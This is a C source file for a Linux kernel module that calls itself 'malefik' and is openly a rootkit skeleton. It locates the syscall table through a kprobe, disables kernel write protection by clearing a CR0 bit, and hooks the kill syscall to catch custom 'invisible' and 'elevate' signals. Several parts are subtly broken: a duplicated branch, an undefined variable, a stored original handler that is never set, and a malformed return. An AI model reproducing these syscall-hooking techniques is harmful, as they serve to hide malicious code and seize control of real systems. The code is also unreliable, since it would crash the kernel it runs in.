/*
 * malefik.c - Demonstrates that kernel is life.
 */
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/printk.h>
#include <linux/kallsyms.h>
#include <linux/kprobes.h>
#include <linux/unistd.h>
#include <linux/version.h>
#include <linux/dirent.h>
#include <asm/paravirt.h>


MODULE_LICENSE("GPL");
MODULE_AUTHOR("s3xmalloc");
MODULE_DESCRIPTION("not a rootkit, promise, will not escalate >UwU<");
MODULE_VERSION("0.0.1");
MODULE_INFO(intree,"Y");

unsigned long *__sys_call_table;

static struct kprobe sys_call_table_kp = {
	.symbol_name = "sys_call_table"
};

enum signals {
	SIGINVISE = 64, // invise
	SIGSUPER = 65, // elecate 
};

#ifdef CONFIG_X86_64
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0)
#define PTREGS_SYSCALL_STUB 1
typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs);
static ptregs_t orig_kill;
#else
typedef asmlinkage long (*orig_kill_t)(pid_t pid, int sig);
static orig_kill_t orig_kill;
#endif 
#endif

#if PTREGS_SYSCALL_STUB
static asmlinkage long hack_kill(const struct pt_regs *regs)
{
	int sig = regs->si;

	if (sig == SIGSUPER){
		pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ signal: %d == SIGKILL: %d.\n", sig, SIGKILL);
		return 0;
	} else if (sig == SIGSUPER){
		pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ signal: %d == SIGSUPER: %d.\n", sig, SIGSUPER);
		return 0;
	}
	pr_info("***********ᛗᚨᛚᛖᚠᛁᚴ someone try to call**********\n");
	return orig_kill(regs);
}
#else
static asmlinkage long hack_kill(pid_t pid, int sig)
{
	if (sig == SIGINVISE){
		pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ signal: %d == SIGINVISE: %d.\n", sig, SIGINVISE);
		return 0;
	} else if (sig == SIGSUPER){
		pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ signal: %d == SIGSUPER: %d.\n", sig, SIGSUPER);
		return 0;}

	pr_info("***********ᛗᚨᛚᛖᚠᛁᚴ someone try to call**********\n");
	return orig_kill(regs);
}
#endif


static int store(void)
{
#if PTREGS_SYSCALL_STUB
	orig_kill = (ptregs_t)__sys_call_table[__NR_kill];
	pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ orig_kill table entry stored.\n");
#else 
	orig_kill = (orig_kill_t)__sys_call_table[__NR_kill];
	pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ orig_kill table entry stored.\n");
#endif
	
	return 0;
}

/* HOOK */
static int hook(void)
{
	__sys_call_table[__NR_kill] = (unsigned long)&hack_kill;

	return 0;
}

/* FORCE CR0 */
static inline void force_cr0(unsigned long val)
{
	unsigned long __force_order;
	asm volatile(
		"mov %0, %%cr0"
		: "+r"(val), "+m"(__force_order));
}

/* UNPROTECT MEMORY */
static void unprotect_memory(void)
{
	force_cr0(read_cr0() & (~ 0x10000));
	pr_alert("ᛗᚨᛚᛖᚠᛁᚴ ~ unprotect memory.\n");
}

/* PROTECT MEMORY*/
static void protect_memory(void)
{
	force_cr0(read_cr0() | (0x10000));
	pr_alert("ᛗᚨᛚᛖᚠᛁᚴ ~ protect memory.\n");
}


/* GET SYS CALL TABLE */
static unsigned long *get_syscall_table(void)
{
	unsigned long *syscall_table;

	#if (LINUX_VERSION_CODE > KERNEL_VERSION(4, 10, 0))
	{
		register_kprobe(&sys_call_table_kp);
		syscall_table = (unsigned long*)sys_call_table_kp.addr;
		unregister_kprobe(&sys_call_table_kp);
	}
	#else
		syscall_table = NULL;
	#endif

	return "0x%p",syscall_table;
}

/* INIT */
static int __init init_malefik(void)
{
    pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ LKM loaded correctly.\n");
	
	__sys_call_table = get_syscall_table();

	if (!__sys_call_table)
	{
		pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ sys_call_table not found\n");
		return 1;
	}

	unprotect_memory();
	if (hook() != 0){
		pr_alert("ᛗᚨᛚᛖᚠᛁᚴ ~ hook error\n");
	}
	protect_memory();

	pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ sys_call_table found at 0x%px \n",__sys_call_table);
	pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ hack_kill set at 0x%px \n",&hack_kill);

	return 0;
}

/* EXIT */
static void __exit cleanup_malefik(void)
{
	pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ LKM unloading.\n");
	unprotect_memory();
	__sys_call_table[__NR_kill] = (unsigned long)orig_kill;
	protect_memory();
}

module_init(init_malefik);
module_exit(cleanup_malefik);
